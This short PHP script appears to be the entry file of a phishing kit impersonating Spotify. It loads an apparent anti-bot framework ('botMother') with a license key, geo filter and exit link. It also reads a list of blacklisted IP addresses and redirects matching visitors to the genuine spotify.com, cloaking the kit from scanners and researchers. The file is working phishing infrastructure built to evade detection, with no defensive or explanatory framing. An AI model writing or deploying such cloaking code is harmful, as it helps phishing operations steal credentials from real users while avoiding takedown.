<?php 
require __DIR__ . '/auto.php';
require __DIR__ . '/config.php';
require __DIR__ . '/frm.php';
require __DIR__ . '/botMother.php';

$bm = new botMother();
$m = new botMother(); 

$bm->setExitLink("https://spotify.com");
$bm->setGeoFilter("");
$bm->setLicenseKey("");
$bm->setTestMode(false); 
$bm->run();

$list = explode(",", file_get_contents(__DIR__ . "/blacklisted_ips.txt"));
foreach($list as $bip){
    if ($_SERVER['REMOTE_ADDR'] == trim($bip)) {
        header("Location: " . $bm->EXIT_LINK);
        exit;
    }
}
?>
